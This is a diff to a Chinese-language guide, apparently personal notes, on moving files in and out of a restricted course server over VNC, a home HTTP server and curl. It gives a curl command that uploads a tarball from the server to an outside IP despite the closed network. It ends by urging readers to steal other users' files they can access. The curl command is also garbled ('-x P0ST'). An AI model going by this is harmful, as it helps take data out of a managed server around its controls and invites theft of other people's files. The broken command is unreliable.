@@ -38,7 +38,7 @@
 
 ## 传文件到服务器
 
-现在是 AI 时代，想必大家都不愿意在服务器里手打，而是 AI 辅助完成后再传到服务器上调试。
+现在是 AI 时代，想必大家都不愿意在服务器里手打，而是 AI 辅助完成后再传到服务器上调试。（或者传一些 Linux 工具）
 
 <details><summary>展开</summary>
 
@@ -52,19 +52,16 @@
 
 在本机开一个 http server（`python -m http.server 55555`），去路由器设置里把本机这个端口暴露到公网。然后在服务器上 `wget http://xxx.xxx.xx.xxx:55555/myfile.txt`，就可以从本机传文件到服务器上了。
 
-然后过了一阵子，课程结束，这时候我发现没法传文件上去了，对外网络已经全部关掉了。也不知道是发现了这个 bug 还是咋地。于是没辙，只好尝试一下给 VNC 窗口发送假的键盘消息。
+然后过了一阵子，课程结束，这时候我发现没法传文件上去了，对外网络已经全部关掉了。也不知道是发现了这个 bug 还是咋地。于是没辙，只好尝试一下 VNC 本身的剪贴板交互。这样只能传输字符，对传二进制需要额外处理。
 
-在 python 中可以使用 `pyautogui` 模块来模拟键盘输入。具体代码在 [send_text.py](./send_text.py) 中。将要发送的内容写到 `text_to_send` 文件中，VNC 里打开 vim 准备输入，然后运行脚本，切换到 VNC 窗口。
-
-这样可能会有格式问题，因为 VNC 上的 vim 被配置了自动缩进。我们需要在 `~/.vimrc` 的末尾添加：
-
-```
-set noautoindent
-set nosmartindent
-set nocindent
-```
-
-这样再运行即可。
+1. Ctrl + Shift + C 复制，Ctrl + Shift + V 粘贴。不过遇到软件本身的 shell 时可能会有光标错位的情况，这时候请使用 gvim 编辑器粘贴命令到脚本中，再执行脚本。
+2. 在 python 中可以使用 `pyautogui` 模块来模拟键盘输入。具体代码在 [send_text.py](./send_text.py) 中。将要发送的内容写到 `text_to_send` 文件中，VNC 里打开 vim 准备输入，然后运行脚本，切换到 VNC 窗口。这样可能会有格式问题，因为 VNC 上的 vim 被配置了自动缩进。我们需要在 `~/.vimrc` 的末尾添加：
+   ```
+   set noautoindent
+   set nosmartindent
+   set nocindent
+   ```
+   这样再运行即可。
 
 </details>
 
@@ -115,6 +112,8 @@ set nocindent
    ```
 
    运行，然后就可以通过 POST 命令上传文件了。这里使用 curl：`curl --noproxy '*' -x P0ST --data-binary @my.tar.gz http://xxx.xxx.xx.xx:55555/a.tar.gz`。noproxy 是必要的，服务器上有奇怪的代理设置。
+
+   或者不用 gpt 脚本，直接用现成库 [uploadserver](https://github.com/Densaugeo/uploadserver) 也行。
 
 仿照这个例子，再把有访问权限的其他人的东西给偷过来。
 
